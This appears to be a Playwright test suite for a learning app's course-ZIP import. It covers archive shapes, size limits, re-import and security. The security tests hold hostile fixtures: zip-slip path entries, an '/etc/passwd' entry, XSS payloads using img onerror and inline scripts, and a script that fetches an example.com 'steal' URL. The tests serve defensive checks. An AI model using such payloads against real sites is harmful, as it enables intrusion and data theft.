// T-008 (tester): independent checks of the course import (T-007) and a
// retest of T-006-fix (D1, D2). Known defects found here are `test.fail()`
// with the id from logs/T-008_tester_*.md; remove `test.fail` when fixed.
//
// Optional: T008_REAL_DIR=/path/to/LRN-<topic> runs the import on a real copy of
// a course kept outside the repository (never committed; D-020, D-026). T008_SHOTS=dir saves screenshots.
import { test, expect } from '@playwright/test';
import { existsSync, mkdirSync } from 'node:fs';
import { basename, join } from 'node:path';
import { strToU8 } from '../../vendor/fflate.js';
import { DRIVE_ZIP_NAME, readFixture, makeZip, splitZips, withChangedLesson, asFile } from '../fixtures/zips.mjs';
import { rawZip, EMPTY_ZIP, cp866 } from '../fixtures/rawzip.mjs';

const FILES = readFixture();
const LESSON_PATH = 'lessons/0001-vidove-chay.html';
const LESSON_ID = `LRN-DEMO/${LESSON_PATH}`;
const REF_ID = 'LRN-DEMO/reference/R01-temperatura-i-vreme.html';
const LESSON = FILES[LESSON_PATH];
const IMPORTED = Object.keys(FILES).filter((p) => !p.endsWith('.pdf')).length; // 11

let consoleErrors;
test.beforeEach(async ({ page }) => {
  consoleErrors = [];
  page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text()); });
  page.on('pageerror', (e) => consoleErrors.push(String(e)));
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
});
test.afterEach(() => { expect(consoleErrors).toEqual([]); });

const result = (page) => page.locator('[data-field="import-result"]');
const errorBox = (page) => page.locator('[data-field="import-error"]');
const ui = (page, input, files) => page.locator(`[data-input="${input}"]`).setInputFiles(files);

/** importCourse() in the page; returns the summary or { error } plus what is stored. */
function imp(page, files) {
  return page.evaluate(async (files) => {
    const m = await import('./src/course-import.js');
    const db = await import('./src/db.js');
    const list = files.map((f) => new File([new Uint8Array(f.bytes)], f.name, { type: f.type || '' }));
    let out;
    try { const s = await m.importCourse(list); out = { ok: true, s, line: m.describeSummary(s) }; }
    catch (e) { out = { ok: false, error: m.errorMessage(e), name: e.name }; }
    out.stored = {};
    for (const c of await db.listCourses()) out.stored[c.id] = (await db.listCourseFiles(c.id)).map((f) => f.path).sort();
    out.lessons = (await db.listLessons('LRN-DEMO')).map((l) => ({ number: l.number, title: l.title, order: l.order, path: l.path, artifactId: l.artifactId }));
    return out;
  }, (Array.isArray(files) ? files : [files]).map((f) => ({ name: f.name, type: f.mimeType, bytes: [...f.buffer] })));
}
const zipOf = (name, buffer) => asFile(name, buffer);

/** All user data (not course files) as comparable JSON. */
const userData = (page) => page.evaluate(async () => {
  const db = await import('./src/db.js');
  const out = {};
  for (const store of ['annotations', 'notes', 'threads', 'messages', 'subtopics', 'settings']) {
    out[store] = (await db.list(store, { includeDeleted: true })).sort((a, b) => String(a.id).localeCompare(String(b.id)));
  }
  out.progress = (await db.listLessons('LRN-DEMO', { includeDeleted: true })).map((l) => [l.id, l.progress]);
  return JSON.parse(JSON.stringify(out));
});

/** Seed one of every kind of user data on the lesson and the reference. */
const seedUserData = (page) => page.evaluate(async ({ LESSON_ID, REF_ID }) => {
  const db = await import('./src/db.js');
  await db.setLessonProgress(LESSON_ID, { status: 'started', scrollY: 640 });
  await db.setLessonProgress(REF_ID, { status: 'done', scrollY: 10 });
  const sel = (exact, start) => ({ quote: { exact }, position: { start, end: start + exact.length } });
  const a = await db.createAnnotation({ courseId: 'LRN-DEMO', target: { type: 'lesson', id: LESSON_ID }, selector: sel('чай', 10), color: 'yellow' });
  const gone = await db.createAnnotation({ courseId: 'LRN-DEMO', target: { type: 'lesson', id: LESSON_ID }, selector: sel('вода', 40), color: 'pink' });
  await db.remove('annotations', gone.id);
  const r = await db.createAnnotation({ courseId: 'LRN-DEMO', target: { type: 'lesson', id: REF_ID }, selector: sel('време', 5), color: 'green' });
  const n = await db.createNote({ annotationId: a.id, body: 'моя бележка' });
  await db.createNote({ annotationId: r.id, body: 'бележка в справочника' });
  const t = await db.createThread({ annotationId: a.id, title: 'Въпрос' });
  await db.createMessage({ threadId: t.id, role: 'user', content: 'Какво е улун?', status: 'done' });
  await db.createSubTopic({ annotationId: a.id, kind: 'термин', title: 'Улун' });
  const a2 = await db.createAnnotation({ courseId: 'LRN-DEMO', target: { type: 'note', id: n.id }, selector: sel('моя', 0), color: 'blue' });
  await db.createNote({ annotationId: a2.id, body: 'бележка върху бележка' });
  await db.saveSettings({ monthlyBudgetUSD: 7 });
}, { LESSON_ID, REF_ID });

// ---------------------------------------------------------------------------
test.describe('T-008 retest of T-006-fix', () => {
  test('D2 (strict): an async migration makes openDb reject, the version and the data stay', async ({ page }) => {
    await page.goto('./tests/db.html?run=none');
    const r = await page.evaluate(async () => {
      const db = await import('../src/db.js');
      const V1 = { 1: db.MIGRATIONS[1] };
      await db.deleteDatabase('t008-mig');
      await db.openDb({ name: 't008-mig', version: 1, migrations: V1 });
      await db.createNote({ annotationId: 'KEEP', body: 'пази' });
      db.closeDb();
      let error = null;
      try {
        await db.openDb({ name: 't008-mig', version: 2, migrations: { ...V1,
          async 2(c, tx) { await new Promise((res) => setTimeout(res, 10)); tx.objectStore('notes').createIndex('by_body', 'body'); } } });
      } catch (e) { error = e.name; }
      const conn = await db.openDb({ name: 't008-mig', version: 1, migrations: V1 });
      const out = { error, version: conn.version, indexes: [...conn.transaction('notes').objectStore('notes').indexNames], body: (await db.byIndex('notes', 'by_annotation', 'KEEP'))[0]?.body };
      await db.deleteDatabase('t008-mig');
      return out;
    });
    expect(r.error).toBe('AbortError');
    expect(r.version).toBe(1);
    expect(r.indexes).not.toContain('by_body');
    expect(r.body).toBe('пази');
  });

  test('D1: progress survives putLesson / saveCourseImport racing setLessonProgress, in both orders', async ({ page }) => {
    await page.goto('./tests/db.html?run=none');
    const r = await page.evaluate(async () => {
      const db = await import('../src/db.js');
      const out = [];
      for (const order of ['putFirst', 'progressFirst']) {
        for (const writer of ['putLesson', 'saveCourseImport']) {
          await db.deleteDatabase('t008-race');
          await db.openDb({ name: 't008-race' });
          await db.putLesson({ id: 'C/l1.html', courseId: 'C', title: 'v1', order: 1 });
          const put = () => (writer === 'putLesson'
            ? db.putLesson({ id: 'C/l1.html', courseId: 'C', title: 'v2', order: 1 })
            : db.saveCourseImport({ course: { id: 'C', title: 'C' }, lessons: [{ id: 'C/l1.html', courseId: 'C', title: 'v2', order: 1 }] }));
          const prog = () => db.setLessonProgress('C/l1.html', { status: 'done', scrollY: 500 });
          await Promise.all(order === 'putFirst' ? [put(), prog()] : [prog(), put()]);
          const l = await db.getLesson('C/l1.html');
          out.push({ order, writer, title: l.title, progress: l.progress });
        }
      }
      await db.deleteDatabase('t008-race');
      return out;
    });
    for (const row of r) expect(row, `${row.writer} / ${row.order}`).toMatchObject({ title: 'v2', progress: { status: 'done', scrollY: 500 } });
  });

  test('D4: a very deep (70 levels) note chain: getLessonTree returns, createSubTopic rejects, both quickly', async ({ page }) => {
    await page.goto('./tests/db.html?run=none');
    const r = await page.evaluate(async () => {
      const db = await import('../src/db.js');
      await db.deleteDatabase('t008-deep');
      await db.openDb({ name: 't008-deep' });
      let target = { type: 'lesson', id: 'L' };
      let last;
      for (let i = 0; i < 70; i++) {
        const a = await db.createAnnotation({ courseId: 'C', target, selector: { quote: { exact: 'x' }, position: { start: 0, end: 1 } } });
        const n = await db.createNote({ annotationId: a.id, body: String(i) });
        target = { type: 'note', id: n.id };
        last = a;
      }
      const t0 = performance.now();
      const tree = await db.getLessonTree('L');
      let depth = 0;
      for (let node = tree; node?.annotations?.length; node = node.annotations[0].notes[0]) depth++;
      const sub = await Promise.race([
        db.createSubTopic({ annotationId: last.id, kind: 'термин' }).then(() => 'created', (e) => `rejected: ${e.message.slice(0, 40)}`),
        new Promise((res) => setTimeout(() => res('hang'), 3000)),
      ]);
      const ms = performance.now() - t0;
      await db.deleteDatabase('t008-deep');
      return { depth, sub, ms };
    });
    expect(r.depth).toBeGreaterThan(0);
    expect(r.depth).toBeLessThanOrEqual(64);
    expect(r.sub).toMatch(/^rejected: Document chain longer than 64/);
    expect(r.ms).toBeLessThan(3000);
  });
});

// ---------------------------------------------------------------------------
test.describe('T-008 ZIP shapes', () => {
  test('ZIP without INDEX.md (with root; and without root with a neutral name): course from the kicker, order by number', async ({ page }) => {
    const noIndex = Object.fromEntries(Object.entries(FILES).filter(([p]) => p !== 'INDEX.md'));
    let r = await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(noIndex)));
    expect(r.ok).toBe(true);
    expect(r.line).toBe('Курсът LRN-DEMO е импортиран: 1 урок, 1 справочник, 2 теста, 12 файла.');
    expect(r.lessons.map((l) => [l.number, l.title, l.order, l.artifactId])).toEqual([
      ['0001', 'Какви видове чай има?', 1, null], ['R01', 'Температура и време за запарване', 2, null]]);
    await page.evaluate(() => indexedDB.deleteDatabase('lrn-app'));
    await page.reload();
    r = await imp(page, zipOf('download.zip', makeZip(noIndex, { root: null })));
    expect(r.ok).toBe(true);
    expect(r.s.courseId).toBe('LRN-DEMO');
  });

  test('a ZIP without INDEX.md and without any course id: clear Bulgarian error, nothing stored', async ({ page }) => {
    await ui(page, 'zip', zipOf('download.zip', makeZip({ 'lessons/0001-a.html': strToU8('<h1>A</h1>') }, { root: null })));
    await expect(errorBox(page)).toHaveText(/^Не мога да разпозная курса\./);
    expect(await imp(page, [])).toMatchObject({ ok: false, error: 'Не е избран файл.', stored: {} });
  });

  test('Drive-like names: .ZIP upper case, no extension, a root with spaces and Cyrillic, "(1)" copies', async ({ page }) => {
    for (const [name, buf] of [
      ['LRN-DEMO.ZIP', makeZip(FILES)],
      ['LRN-DEMO', makeZip(FILES)],
      ['Моят курс чай-20261118T090000Z-1-001.zip', makeZip(FILES, { root: 'Моят курс чай' })],
      ['LRN-DEMO-20261118T090000Z-1-001 (1).zip', makeZip(FILES)],
    ]) {
      const r = await imp(page, zipOf(name, buf));
      expect(r.ok, name).toBe(true);
      expect(r.s.courseId, name).toBe('LRN-DEMO');
      expect(r.stored['LRN-DEMO'], name).toHaveLength(IMPORTED);
      expect(Object.keys(r.stored), name).toEqual(['LRN-DEMO']);
    }
  });

  test('Cyrillic and spaces in file names inside the ZIP (UTF-8 flag) are kept as is', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON },
      { name: 'LRN-DEMO/lessons/0002-роли и задължения.html', data: strToU8('<h1>Роли и задължения</h1>') },
      { name: 'LRN-DEMO/assets/стил 2.css', data: strToU8('a{}') },
    ])));
    expect(r.ok).toBe(true);
    expect(r.stored['LRN-DEMO']).toEqual(['assets/стил 2.css', LESSON_PATH, 'lessons/0002-роли и задължения.html']);
    expect(r.lessons.map((l) => l.title)).toEqual(['Какви видове чай има?', 'Роли и задължения']);
  });

  test('observation: a ZIP without the UTF-8 flag (CP866 names) imports, but the path is mojibake', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON },
      { name: cp866('LRN-DEMO/lessons/0002-роли.html'), data: strToU8('<h1>Роли</h1>') },
    ])));
    expect(r.ok).toBe(true);
    expect(r.lessons.map((l) => l.title)).toEqual(['Какви видове чай има?', 'Роли']); // the title is fine
    expect(r.stored['LRN-DEMO'].some((p) => p.includes('роли'))).toBe(false); // the name is not
  });

  test('PDFs are skipped anywhere, in any letter case, in ZIPs and as loose files', async ({ page }) => {
    let r = await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip({ ...FILES, 'lessons/x.PDF': strToU8('%PDF'), 'reference/y.Pdf': strToU8('%PDF'), 'a.pdf': strToU8('%PDF') })));
    expect(r.ok).toBe(true);
    expect(r.s.skippedPdf).toBe(5);
    expect(r.stored['LRN-DEMO'].filter((p) => /\.pdf$/i.test(p))).toEqual([]);
    r = await imp(page, [asFile('INDEX.md', Buffer.from(FILES['INDEX.md']), 'text/markdown'), asFile('Насоки.PDF', Buffer.from('%PDF-1.7'), 'application/pdf')]);
    expect(r.s.skippedPdf).toBe(1);
    expect(r.stored['LRN-DEMO'].filter((p) => /\.pdf$/i.test(p))).toEqual([]);
  });

  test('a big course ZIP with 120 MB of PDFs imports fast; the PDFs are not stored', async ({ page }, info) => {
    test.skip(info.project.name !== 'tablet-landscape', 'memory-heavy, once');
    const zip = [...makeZip(FILES)];
    const r = await page.evaluate(async (zip) => {
      const { zipSync, unzipSync } = await import('./vendor/fflate.js');
      const { importCourse } = await import('./src/course-import.js');
      const db = await import('./src/db.js');
      const files = Object.fromEntries(Object.entries(unzipSync(new Uint8Array(zip))).filter(([k]) => !k.endsWith('/')));
      for (let i = 0; i < 8; i++) files[`LRN-DEMO/sources/doc${i}.pdf`] = new Uint8Array(15 * 1048576);
      const big = zipSync(files, { level: 0 });
      const t0 = performance.now();
      const s = await importCourse([new File([big], 'LRN-DEMO-20261118T090000Z-1-001.zip')]);
      const ms = performance.now() - t0;
      const est = (await db.listCourseFiles('LRN-DEMO')).reduce((n, f) => n + f.size, 0);
      return { mb: big.length / 1048576, ms, pdf: s.skippedPdf, storedBytes: est };
    }, zip);
    info.annotations.push({ type: 'perf', description: JSON.stringify(r) });
    expect(r.mb).toBeGreaterThan(119);
    expect(r.pdf).toBe(10);
    expect(r.storedBytes).toBeLessThan(200_000);
    expect(r.ms).toBeLessThan(3000);
  });

  test('real course copy (T008_REAL_DIR, outside the repository; D-026): ZIP and split ZIP, < 3 s at CPU ×4, then "без промени"', async ({ page }, info) => {
    const dir = process.env.T008_REAL_DIR;
    test.skip(!dir || !existsSync(dir) || info.project.name !== 'tablet-landscape', 'needs T008_REAL_DIR');
    test.setTimeout(120_000);
    const real = readFixture(dir);
    const root = basename(dir.replace(/[\\/]+$/, '')); // e.g. LRN-XYZ: only generic checks here, no course content
    const zipName = `${root}-20261118T090000Z-1-001.zip`;
    const zip = [...makeZip(real, { root })];
    const cdp = await page.context().newCDPSession(page);
    await cdp.send('Emulation.setCPUThrottlingRate', { rate: 4 });
    const r = await page.evaluate(async ({ zip, name }) => {
      const { importCourse, describeSummary } = await import('./src/course-import.js');
      const file = () => new File([new Uint8Array(zip)], name, { type: 'application/zip' });
      const t0 = performance.now();
      const s1 = await importCourse([file()]);
      const ms = performance.now() - t0;
      const s2 = await importCourse([file()]);
      return { ms, mb: zip.length / 1048576, first: describeSummary(s1), items: s1.items, pdf: s1.skippedPdf, title: s1.title, second: s2.status };
    }, { zip, name: zipName });
    await cdp.send('Emulation.setCPUThrottlingRate', { rate: 1 });
    info.annotations.push({ type: 'perf', description: `real course ${r.mb.toFixed(1)} MB: ${Math.round(r.ms)} ms (CPU ×4)` });
    const first = new RegExp(`^Курсът ${root} е импортиран: \\d+ урока?, \\d+ справочника?(, \\d+ теста?)?, \\d+ файла?\\.$`);
    expect(r.first).toMatch(first);
    expect(r.items.length).toBeGreaterThan(0);
    expect(r.items.every((i) => i.title && i.title.length > 1)).toBe(true);
    expect(r.title.length).toBeGreaterThan(1);
    expect(r.second).toBe('unchanged');
    expect(r.ms).toBeLessThan(3000);
    // The same real course as two Drive parts in a fresh database.
    await page.evaluate(() => new Promise((res) => { const q = indexedDB.deleteDatabase('lrn-app'); q.onsuccess = q.onerror = q.onblocked = res; }));
    await page.reload();
    const parts = splitZips(Object.fromEntries(Object.entries(real).filter(([p]) => !p.endsWith('.pdf'))), 2, root);
    const s = await imp(page, parts);
    expect(s.line).toBe(r.first);
  });
});

// ---------------------------------------------------------------------------
test.describe('T-008 broken and hostile files (Bulgarian errors, nothing stored)', () => {
  const cases = [
    ['an empty ZIP (no entries)', () => zipOf('LRN-DEMO.zip', EMPTY_ZIP), 'ZIP архивът е празен.'],
    ['a ZIP with directories only', () => zipOf('LRN-DEMO.zip', rawZip([{ name: 'LRN-DEMO/' }, { name: 'LRN-DEMO/lessons/' }])), 'ZIP архивът е празен.'],
    ['a RAR renamed to .zip', () => zipOf('LRN-DEMO.zip', Buffer.from('Rar!\x1a\x07\x00 ...')), 'Файлът „LRN-DEMO.zip“ не е ZIP архив.'],
    ['a ZIP cut before the end record', () => { const z = makeZip(FILES); return zipOf('LRN-DEMO.zip', z.subarray(0, Math.floor(z.length / 2))); }, 'Файлът „LRN-DEMO.zip“ не може да се отвори: ZIP архивът е повреден или непълен.'],
    ['a ZIP cut by one byte', () => { const z = makeZip(FILES); return zipOf('LRN-DEMO.zip', z.subarray(0, z.length - 1)); }, 'Файлът „LRN-DEMO.zip“ не може да се отвори: ZIP архивът е повреден или непълен.'],
    ['a ZIP with an unsupported compression method (bzip2)', () => zipOf('LRN-DEMO.zip', rawZip([{ name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON, method: 12 }])), 'ZIP архивът е повреден или непълен.'],
    ['a ZIP with photos only', () => zipOf('photos.zip', makeZip({ 'IMG_0001.jpg': new Uint8Array([255, 216, 255]) }, { root: 'Снимки' })), 'Това не прилича на курс LRN'],
    ['a not-a-course loose file with spaces in the name', () => asFile('0002 роли.html', Buffer.from('<h1>Роли</h1>'), 'text/html'), 'Това не прилича на курс LRN'],
  ];
  for (const [name, file, message] of cases) {
    test(name, async ({ page }) => {
      await ui(page, /\.zip$|^LRN-DEMO$/i.test(file().name) ? 'zip' : 'files', file());
      await expect(errorBox(page)).toBeVisible();
      await expect(errorBox(page)).toContainText(message);
      await expect(result(page)).toBeHidden();
      await expect(page.locator('[data-action="import-zip"]')).toBeEnabled();
      expect(await page.evaluate(async () => (await (await import('./src/db.js')).listCourses()).length)).toBe(0);
    });
  }

  test('limits: a 60 MB entry, a 60 MB loose file, 2100 files, > 200 MB unpacked: Bulgarian errors', async ({ page }, info) => {
    test.skip(info.project.name !== 'tablet-landscape', 'memory-heavy, once');
    const r = await page.evaluate(async () => {
      const m = await import('./src/course-import.js');
      const { zipSync } = await import('./vendor/fflate.js');
      const MB = (n) => new Uint8Array(n * 1048576);
      const run = async (files) => { try { await m.importCourse(files); return 'ok'; } catch (e) { return m.errorMessage(e); } };
      const many = {}; for (let i = 0; i < 2100; i++) many[`LRN-DEMO/assets/f${i}.css`] = new Uint8Array([97]);
      return {
        entry: await run([new File([zipSync({ 'LRN-DEMO/lessons/0001-a.html': MB(60) })], 'LRN-DEMO.zip')]),
        loose: await run([new File([MB(60)], '0001-big.html')]),
        many: await run([new File([zipSync(many, { level: 0 })], 'LRN-DEMO.zip')]),
        total: await run([new File([zipSync(Object.fromEntries([...Array(5)].map((_, i) => [`LRN-DEMO/assets/f${i}.js`, MB(45)])))], 'LRN-DEMO.zip')]),
        courses: (await (await import('./src/db.js')).listCourses()).length,
      };
    });
    expect(r).toEqual({
      entry: 'Файлът „LRN-DEMO/lessons/0001-a.html“ в архива е твърде голям.',
      loose: 'Файлът „lessons/0001-big.html“ е твърде голям (60 MB).',
      many: 'Твърде много файлове (над 2000). Това не прилича на курс.',
      total: 'Курсът е твърде голям (над 200 MB без PDF-ите).',
      courses: 0,
    });
  });

  test('FIXED T008-D3: the 200 MB limit is checked from the headers, before unpacking (a 1 MB ZIP of ~1 GB)', async ({ page }, info) => {
    test.skip(info.project.name !== 'tablet-landscape', 'memory-heavy, once');
    const r = await page.evaluate(async () => {
      const m = await import('./src/course-import.js');
      const { zipSync } = await import('./vendor/fflate.js');
      const zip = zipSync(Object.fromEntries([...Array(20)].map((_, i) => [`LRN-DEMO/assets/f${i}.js`, new Uint8Array(49 * 1048576)])));
      const t0 = performance.now();
      let msg;
      try { await m.importCourse([new File([zip], 'LRN-DEMO.zip')]); } catch (e) { msg = m.errorMessage(e); }
      return { zipKB: zip.length / 1024, msg, ms: performance.now() - t0 };
    });
    info.annotations.push({ type: 'T008-D3', description: JSON.stringify(r) });
    expect(r.zipKB).toBeLessThan(1100);
    expect(r.msg).toBe('Курсът е твърде голям (над 200 MB без PDF-ите).');
    // Refused from the headers, without allocating ~1 GB: well under a second.
    expect(r.ms).toBeLessThan(500);
  });

  test('FIXED T008-D2: a ZIP whose data does not match its CRC-32 is refused', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON, crc: 0x12345678 },
    ])));
    expect(r.ok).toBe(false);
    expect(r.error).toContain('повреден');
    expect(r.stored).toEqual({});
  });

  test('zip-slip: entries with "..", backslashes or "./" never leave the course; the rest imports', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON },
      { name: 'LRN-DEMO/../evil.html', data: strToU8('x') },
      { name: '../../evil2.js', data: strToU8('x') },
      { name: 'LRN-DEMO/lessons/..\\..\\evil3.html', data: strToU8('x') },
      { name: 'LRN-DEMO/./lessons/./0002-b.html', data: strToU8('<h1>B</h1>') },
    ])));
    expect(r.ok).toBe(true);
    expect(r.stored).toEqual({ 'LRN-DEMO': [LESSON_PATH, 'lessons/0002-b.html'] });
    const keys = await page.evaluate(async () => (await (await import('./src/db.js')).list('files', { includeDeleted: true })).map((f) => f.key));
    for (const k of keys) {
      expect(k.startsWith('LRN-DEMO/'), k).toBe(true);
      expect(k.split('/'), k).not.toContain('..');
    }
  });

  test('observation: an absolute path entry makes the whole ZIP "not a course" (safe failure)', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON }, { name: '/etc/passwd', data: strToU8('x') },
    ])));
    expect(r).toMatchObject({ ok: false, stored: {} });
    expect(r.error).toContain('не прилича на курс LRN');
  });

  test('observation for T-009: URL-encoded "%2e%2e" is stored literally (the Service Worker must not decode it into "..")', async ({ page }) => {
    const r = await imp(page, zipOf('LRN-DEMO.zip', rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: LESSON }, { name: 'LRN-DEMO/assets/%2e%2e/x.js', data: strToU8('x') },
    ])));
    expect(r.stored['LRN-DEMO']).toContain('assets/%2e%2e/x.js');
  });
});

// ---------------------------------------------------------------------------
test.describe('T-008 re-import keeps everything', () => {
  test('same ZIP, one part of a split ZIP, INDEX.md alone, changed lesson: user data identical, files never lost', async ({ page }) => {
    let r = await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    expect(r.s.status).toBe('new');
    await seedUserData(page);
    const before = await userData(page);
    const steps = [
      ['same ZIP', [zipOf(DRIVE_ZIP_NAME, makeZip(FILES))], 'unchanged'],
      ['part 1 of 2 only', [splitZips(FILES, 2)[0]], null],
      ['both parts', splitZips(FILES, 2), null],
      ['INDEX.md as a loose file', [asFile('INDEX.md', Buffer.from(FILES['INDEX.md']), 'text/markdown')], 'unchanged'],
      ['the folder again (webkitdirectory-like paths)', [zipOf('LRN-DEMO.zip', makeZip(FILES, { root: null }))], 'unchanged'],
      ['changed lesson', [zipOf('LRN-DEMO-20261119T090000Z-1-001.zip', makeZip(withChangedLesson(FILES)))], 'updated'],
    ];
    for (const [name, files, status] of steps) {
      r = await imp(page, files);
      expect(r.ok, name).toBe(true);
      if (status) expect(r.s.status, name).toBe(status);
      expect(r.stored['LRN-DEMO'], name).toHaveLength(IMPORTED);
      expect(r.lessons.map((l) => `${l.order} ${l.number}`), name).toEqual(['1 0001', '2 R01']);
      expect(await userData(page), name).toEqual(before);
    }
    expect(r.line).toContain('нови уроци: 0, променени: 1');
  });

  test('re-import restores a soft-deleted course and keeps its user data', async ({ page }) => {
    await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    await seedUserData(page);
    const before = await userData(page);
    await page.evaluate(async () => { const db = await import('./src/db.js'); await db.remove('courses', 'LRN-DEMO'); });
    const r = await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    expect(r.ok).toBe(true);
    expect(Object.keys(r.stored)).toEqual(['LRN-DEMO']);
    expect(await userData(page)).toEqual(before);
  });

  test('FIXED T008-D4: a split part without INDEX.md keeps artifactId of the lessons in it', async ({ page }) => {
    await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    const part2 = splitZips(FILES, 2)[1]; // MISSION, RESOURCES, quiz.js, style.css, lesson 0001 (no INDEX.md)
    const r = await imp(page, [part2]);
    expect(r.s.status).toBe('unchanged');
    expect(r.lessons.find((l) => l.number === '0001').artifactId).toBe('DemoArtifact0001');
  });

  test('FIXED T008-D1: a loose lesson downloaded twice ("… (1).html") is the same lesson 0001', async ({ page }) => {
    await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    const r = await imp(page, [asFile('0001-vidove-chay (1).html', Buffer.from(LESSON), 'text/html')]);
    expect(r.lessons.map((l) => l.number)).toEqual(['0001', 'R01']);
    expect(r.stored['LRN-DEMO']).toHaveLength(IMPORTED);
  });

  test('FIXED observation: "Без промени" does not rewrite the course record (updatedAt stays)', async ({ page }) => {
    await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    const t1 = await page.evaluate(async () => (await (await import('./src/db.js')).getCourse('LRN-DEMO')).updatedAt);
    await page.waitForTimeout(20);
    const r = await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    const t2 = await page.evaluate(async () => (await (await import('./src/db.js')).getCourse('LRN-DEMO')).updatedAt);
    expect(r.s.status).toBe('unchanged');
    expect(t2).toBe(t1); // relevant for the backup merge by updatedAt (D-014)
  });
});

// ---------------------------------------------------------------------------
test.describe('T-008 security: nothing from the course runs in the app', () => {
  test('HTML in titles, MISSION and file names stays text; course scripts never run or load', async ({ page }) => {
    const requests = [];
    page.on('request', (q) => requests.push(q.url()));
    await page.evaluate(() => { window.__xss = []; });
    const evil = {
      ...FILES,
      'MISSION.md': strToU8('# Мисия: <img src=x onerror="__xss.push(3)"> Тест\n'),
      [LESSON_PATH]: strToU8('<!DOCTYPE html><html><head><title>x</title><script>__xss.push(1)</script></head><body>'
        + '<p class="kicker">LRN-DEMO · Урок 0001</p><h1>&lt;img src=x onerror="__xss.push(2)"&gt; Урок</h1>'
        + '<img src="https://example.com/track.png" onerror="__xss.push(4)"><script src="../assets/evil.js"></script></body></html>'),
      'assets/evil.js': strToU8('__xss.push(5); fetch("https://example.com/steal");'),
    };
    await ui(page, 'zip', zipOf(DRIVE_ZIP_NAME, makeZip(evil)));
    await expect(result(page)).toBeVisible();
    await expect(result(page)).toContainText('0001 <img src=x onerror="__xss.push(2)"> Урок');
    await expect(result(page).locator('img, script')).toHaveCount(0);
    const card = page.locator('[data-course="LRN-DEMO"]');
    await expect(card).toContainText('<img src=x onerror="__xss.push(3)"> Тест');
    await expect(card.locator('img')).toHaveCount(0);
    await card.click();
    await expect(page.locator('[data-screen="course"] [data-lesson]').first()).toContainText('<img src=x');
    await expect(page.locator('[data-screen="course"] img')).toHaveCount(0);
    await page.waitForTimeout(300);
    expect(await page.evaluate(() => window.__xss)).toEqual([]);
    // A hostile file name in an error message.
    await page.goto('./');
    await page.evaluate(() => { window.__xss = []; });
    await ui(page, 'zip', asFile('<img src=x onerror="__xss.push(6)">.zip', Buffer.from('not a zip')));
    await expect(errorBox(page)).toContainText('<img src=x onerror="__xss.push(6)">.zip');
    await expect(errorBox(page).locator('img')).toHaveCount(0);
    await page.waitForTimeout(300);
    expect(await page.evaluate(() => window.__xss)).toEqual([]);
    expect(requests.filter((u) => !u.startsWith('http://localhost'))).toEqual([]);
    expect(requests.filter((u) => /evil\.js|track\.png|\/c\//.test(u))).toEqual([]);
  });

  // Updated in T-009: course files are now served at ./c/<course>/…, but only
  // by the Service Worker from IndexedDB and always with the lesson CSP.
  test('since T-009 ./c/<course>/… is served only from IndexedDB, with the lesson CSP', async ({ page }) => {
    await imp(page, zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    await page.evaluate(() => navigator.serviceWorker.ready);
    await page.reload();
    const r = await page.evaluate(async () => {
      const res = await fetch('./c/LRN-DEMO/assets/quiz.js');
      return { status: res.status, csp: res.headers.get('content-security-policy'), body: (await res.text()).slice(0, 40) };
    });
    expect(r.status).toBe(200);
    expect(r.csp).toContain("connect-src 'none'");
    expect(r.body).toContain('quiz');
  });
});

// ---------------------------------------------------------------------------
test.describe('T-008 screenshots of "Курсове"', () => {
  test('empty, imported, updated, error', async ({ page }, info) => {
    const dir = process.env.T008_SHOTS;
    test.skip(!dir, 'set T008_SHOTS=dir to save screenshots');
    mkdirSync(dir, { recursive: true });
    const shot = (name) => page.screenshot({ path: join(dir, `${info.project.name}-${name}.png`), fullPage: true });
    await shot('1-empty');
    await ui(page, 'zip', zipOf(DRIVE_ZIP_NAME, makeZip(FILES)));
    await expect(result(page)).toBeVisible();
    await shot('2-imported');
    await ui(page, 'zip', zipOf('LRN-DEMO-20261119T090000Z-1-001.zip', makeZip(withChangedLesson(FILES))));
    await expect(result(page).locator('[data-status="updated"]')).toBeVisible();
    await shot('3-updated');
    await ui(page, 'zip', zipOf('LRN-DEMO.zip', makeZip(FILES).subarray(0, 4000)));
    await expect(errorBox(page)).toBeVisible();
    await shot('4-error-broken');
    await ui(page, 'files', asFile('IMG_0001.jpg', Buffer.from([255, 216, 255]), 'image/jpeg'));
    await expect(errorBox(page)).toContainText('не прилича');
    await shot('5-error-not-course');
    await page.locator('[data-course="LRN-DEMO"]').click();
    await expect(page.locator('[data-screen="course"] [data-lesson]')).toHaveCount(2);
    await shot('6-course');
  });
});
